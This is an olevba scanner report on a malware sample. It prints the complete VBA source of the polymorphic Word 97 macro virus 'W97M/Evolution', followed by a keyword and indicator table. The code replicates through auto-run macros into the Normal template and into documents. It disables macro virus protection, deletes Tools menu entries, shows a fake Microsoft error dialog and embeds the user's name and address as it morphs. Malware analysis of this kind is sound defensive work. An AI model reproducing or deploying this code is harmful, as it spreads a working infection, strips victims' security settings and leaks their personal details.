olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Evolution.c-987decfbfe795323ea7619af552b0790c2bc9164
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Evolution.c-987decfbfe795323ea7619af552b0790c2bc9164 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LFGYAFNMUQMUMYJPUPAORTVFRRS.bas 
in file: Virus.MSWord.Evolution.c-987decfbfe795323ea7619af552b0790c2bc9164 - OLE stream: 'Macros/VBA/LFGYAFNMUQMUMYJPUPAORTVFRRS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Source As String
 'Replication System
Public ByeMacro As String
 '
Public Hostinf As Boolean
Public FileInf As Boolean
 '
Public FExport As String
Public PMExport As String
 '
Public PMFile_Yes As Boolean
Public Ex_Yes As Boolean
 'Replication System
Public Filename As String
Public FileID As String
Public FileID2 As String
Public Virname As String
 'Replication System
Public FC_There As Boolean
 'Replication System
Public FO_There As Boolean
 '
Public FP_There As Boolean
Public FN_There As Boolean
 'RS
Public FS_There As Boolean
 '
Public FSA_There As Boolean
 '
Public VrusName As String
Public Armor As Boolean
Function Self_Recognition()
On Error Resume Next
 'RS
Application.EnableCancelKey = wdCancelDisabled
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
Do
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
 'RS
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
 '
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
 'RS
newname:
Close #1
 '
Open "C:\windows\system\vnames.cpl" For Append As #1
 'RS
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
 'Replication System
        End If
 'Replication System
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
 'Replication System
lost:
 'RS
Next Z
Loop Until EOF(1)
Close #1
Dim Lib
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
 '
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
 '
skip:
 'Replication System
Next Lib
 'RS
Loop Until EOF(1)
 'Replication System
doccheck:
Close #1
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
Do
Line Input #1, Virname
 '
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
 '
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
 'Replication System
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
 '
nope:
Next Lib
 '
Loop Until EOF(1)
 'RS
FileInf = False
leave:
 'Replication System
Close #1
 'Replication System
End Function
Function Armor_Status()
 'RS
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
 'RS
Offense:
 '
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
 '
End Function
Function Export_Code()
 '
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\export.sys")
 'RS
If FExport = "Export.sys" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
 'Replication System
Morph:
 'Replication System
Randomize Timer
 'RS
q = Int(Rnd(1) * 5) + 1
 '
For vi = 1 To q
x = Int(Rnd(1) * 26)
 'Replication System
If x = 1 Then a$ = "A"
 '
If x = 2 Then a$ = "B"
 'RS
If x = 3 Then a$ = "C"
 '
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
 'RS
If x = 7 Then a$ = "G"
 'RS
If x = 8 Then a$ = "H"
 'Replication System
If x = 9 Then a$ = "I"
 'RS
If x = 10 Then a$ = "J"
 '
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
 '
If x = 13 Then a$ = "M"
 'Replication System
If x = 14 Then a$ = "N"
 'RS
If x = 15 Then a$ = "O"
 'RS
If x = 16 Then a$ = "P"
 'RS
If x = 17 Then a$ = "Q"
 'RS
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
 'Replication System
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
 'Replication System
If x = 25 Then a$ = "Y"
 'RS
If x = 26 Then a$ = "Z"
 'RS
Filename = Filename + a$
 'Replication System
Next vi
x = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & x & ".cpl"
' RAPE v1.1 Export File ID Morph
 '
Open "C:\windows\system\Export.sys" For Append As #1
 'RS
Print #1, FileID
 '
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 'RS
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
 '
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
 'RS
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 '
Close #1
 'Replication System
nex:
 'Replication System
Next x
 '
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo nextt
Do
 '
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
 '
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
 'RS
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
 'RS
nextt:
 '
Exit Function
 '
Recognize:
Open "C:\windows\system\Export.sys" For Input As #1
 '
Line Input #1, FileID
Close #1
 '
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
Do
On Error Resume Next
 'Replication System
Open "C:\windows\system\vnames.cpl" For Input As #1
 'RS
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
 'Replication System
tryharder:
 '
End Function
 'RS
Function Polymorphic_Check()
 'Replication System
On Error Resume Next
 'RS
Application.EnableCancelKey = wdCancelDisabled
Open FileID2 For Input As #1
Dim FC_Check
 'RS
Do
 '
    Line Input #1, FC_Check
 'RS
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
Dim FO_Check
Do
    Line Input #1, FO_Check
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
 'Replication System
Dim FP_Check
Do
    Line Input #1, FP_Check
 'Replication System
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
Loop Until EOF(1)
FN_Look:
Dim FN_Check
 'Replication System
Do
    Line Input #1, FN_Check
 'RS
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
 'RS
Loop Until EOF(1)
FS_Look:
Dim FS_Check
 'Replication System
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
 'Replication System
Loop Until EOF(1)
 'RS
FSA_Look:
Dim FSA_Check
Do
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
 'Replication System
Loop Until EOF(1)
 'RS
End Function
 '
Function Evolve()
 'Replication System
On Error Resume Next
 '
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
'RAPE v1.1 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
Open "C:\windows\system\Export.sys" For Input As #1
 'Replication System
Line Input #1, FileID2
 'RS
Close #1
 'Replication System
PM = Int(Rnd(1) * 150) + 1
 'Replication System
If PM = 22 Then
If FC_There = True Then Exit Function
 'RS
Open FileID2 For Append As #1
 'RS
Print #1, "Sub FileClose()"
Print #1, "On error resume next"
 '
Print #1, "Call Evolution"
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
End If
 'RS
If PM = 73 Then
 'RS
If FO_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
 'RS
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call Evolution"
 '
Print #1, "end sub"
Close #1
 '
End If
 '
If PM = 69 Then
If FP_There = True Then Exit Function
 'Replication System
Open FileID2 For Append As #1
Print #1, "Sub FilePrint()"
 '
Print #1, "on error resume next"
 '
Print #1, "Dialogs(wdDialogFilePrint)"
 '
Print #1, "Call Evolution"
 'RS
Print #1, "End sub"
 '
Close #1
 'Replication System
End If
 'Replication System
If PM = 122 Then
 '
If FN_There = True Then Exit Function
 'Replication System
Open FileID2 For Append As #1
 '
Print #1, "Sub FileNew()"
 'RS
Print #1, "on error resume next"
 '
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call Evolution"
Print #1, "End Sub"
 '
Close #1
 'Replication System
End If
 '
If PM = 90 Then
 'Replication System
If FS_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileSave()"
 '
Print #1, "on error resume next"
Print #1, "call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
 'Replication System
End If
If PM = 8 Then
If FSA_There = True Then Exit Function
 '
Open FileID2 For Append As #1
 'RS
Print #1, "Sub FileSaveAs()"
Print #1, "on error resume next"
 'Replication System
Print #1, "Dialogs(wdDialogFileSaveAs)"
Print #1, "Call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
End Function
 'RS
Function Norminf()
 'Replication System
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
 'Replication System
Line Input #1, FileID2
 'Replication System
Close #1
 '
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
 'Replication System
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
 '
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
 '
        Open "C:\windows\system\vnames.cpl" For Append As #1
 '
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
 'Replication System
nexus:
 '
    Next l
 '
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
End With
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
End Function
 'RS
Function FileInft()
On Error Resume Next
 'Replication System
Application.EnableCancelKey = wdCancelDisabled
 '
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
 '
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
 'Replication System
End With
 'RS
Randomize Timer
 'RS
WD = Int(Rnd(1) * 8) + 2
 'RS
For evo = 2 To WD
 'RS
x = Int(Rnd(1) * 26)
 'RS
If x = 1 Then a$ = "A"
 'Replication System
If x = 2 Then a$ = "B"
 'RS
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
 'Replication System
If x = 5 Then a$ = "E"
 'Replication System
If x = 6 Then a$ = "F"
 '
If x = 7 Then a$ = "G"
 '
If x = 8 Then a$ = "H"
 '
If x = 9 Then a$ = "I"
 'RS
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
 'Replication System
If x = 12 Then a$ = "L"
 'Replication System
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
 'RS
If x = 15 Then a$ = "O"
 '
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
 'RS
If x = 18 Then a$ = "R"
 '
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
 'RS
If x = 22 Then a$ = "V"
 '
If x = 23 Then a$ = "W"
 'RS
If x = 24 Then a$ = "X"
 'Replication System
If x = 25 Then a$ = "Y"
 '
If x = 26 Then a$ = "Z"
 'Replication System
VrusName = VrusName + a$
Next evo
 '
Open "C:\windows\system\vnames.cpl" For Input As #1
 'Replication System
Do
 '
Line Input #1, Virname
 'RS
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
 'RS
' RAPE v1.1 Macro Virus Name Randomizer - 2 to 8 letters
Loop Until EOF(1)
 'RS
Close #1
 '
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
 '
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
 'Replication System
Open "C:\windows\system\vnames.cpl" For Append As #1
 '
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
 'Replication System
Close #1
nex:
Next x
 'Replication System
End Function
 'RS
Function Evolution()
On Error Resume Next
 'Replication System
Application.EnableCancelKey = wdCancelDisabled
Call Self_Recognition
 'Replication System
Call Armor_Status
 '
Call Export_Code
 'RS
Call Polymorphic_Check
Call Evolve
If Hostinf = False Then Call Norminf
If FileInf = False Then Call FileInft
 'Replication System
Options.VirusProtection = False
 'Replication System
Options.ConfirmConversions = False
 'RS
Options.SaveNormalPrompt = False
 'Replication System
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
' W97M/Evolution
' W97M/Evolution .a Variant by Nex and Error
' Polymorphic Stealth Word97 Macro Virus
' All Things Must Change...
 'RS
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error
 '
' RAPE v1.1 does:
' Randomly Morphs Source Code by Adding Random Remarks
 'RS
' Randomly Selects Source Code Export File - Then Morphs it
 '
' Randomly Creates Virus Macro Name
 '
' Randomly Adds 1 to 6 Commands to Code
End Function
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'RS
Call Evolution
 '
Wordbasic.FileSave
 'RS
End Sub
 'Replication System
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
Call Armor_Status
Options.VirusProtection = False
 'Replication System
Options.ConfirmConversions = False
 'RS
Options.SaveNormalPrompt = False
 'RS
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 'Replication System
End Sub
Sub AutoExit()
On Error Resume Next
 'Replication System
Application.EnableCancelKey = wdCancelDisabled
 'RS
Call Evolution
 '
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
 'Replication System
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
 '
If PMFile_Yes = True Then Exit Sub
 'Replication System
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
 '
Print #1, "W97M/Evolution .a by Nex"
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
 '
Close #1
Open "C:\windows\system\Export.sys" For Input As #2
 'Replication System
Line Input #2, FileID
 'Replication System
Close #2
 'RS
Open FileID For Append As #9
 'RS
Print #9, "' EOF"
Close #9
 '
Open FileID For Input As #3
Randomize Timer
W = Int(Rnd(1) * 5) + 1
For vir = 1 To W
x = Int(Rnd(1) * 26)
 'RS
If x = 1 Then a$ = "A"
 '
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
 'RS
If x = 6 Then a$ = "F"
 'RS
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
 '
If x = 10 Then a$ = "J"
 '
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
 'Replication System
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
 '
If x = 15 Then a$ = "O"
 '
If x = 16 Then a$ = "P"
 '
If x = 17 Then a$ = "Q"
 '
If x = 18 Then a$ = "R"
 '
If x = 19 Then a$ = "S"
 'RS
If x = 20 Then a$ = "T"
 'RS
If x = 21 Then a$ = "U"
 '
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
 'RS
If x = 24 Then a$ = "X"
 'RS
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
 '
Filename = Filename + a$
 '
Next vir
 'RS
F = Int(Rnd(1) * 999) + 1
 'Replication System
FileID2 = "C:\windows\system\" & Filename & F & ".cpl"
Open FileID2 For Append As #4
 'RS
Do
 'Replication System
inpux:
Line Input #3, stuff
 '
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
    If t = 1 Then Z$ = " '" & Application.UserName
    If t = 2 Then Z$ = " '" & Application.UserInitials
 'Replication System
    If t = 3 Then Z$ = " '" & Application.UserAddress
    If t >= 4 Then GoTo inpux
    Print #4, Z$
 '
' Source Code Morpher - adds random remarks to Code (RAPE v1.1 by Error)
 '
Loop Until stuff = "' EOF"
 'Replication System
Close #3
 'RS
Close #4
 '
Kill "C:\windows\system\export.sys"
Open "C:\windows\system\Export.sys" For Append As #5
 'RS
Print #5, FileID2
Close #5
 '
End Sub
Sub AutoNew()
 'Replication System
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
Sub AutoOpen()
On Error Resume Next
 'RS
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
Call Evolution
 'RS
End Sub
 'RS
Sub FileTemplates()
 'RS
Application.EnableCancelKey = wdCancelDisabled
 '
End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled
 'RS
End Sub
 'RS
Sub ToolsMacro()
 '
Application.EnableCancelKey = wdCancelDisabled
 'Replication System
End Sub
Sub ViewVBCode()
 'RS
Application.EnableCancelKey = wdCancelDisabled
End Sub
 'RS
' "The most polymorphic Macro Virus to date...." - NAI
 '
' EOF

' EOF
' EOF
 'RS
Sub FileClose()
On Error Resume Next
Call Evolution
Wordbasic.FileSave
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

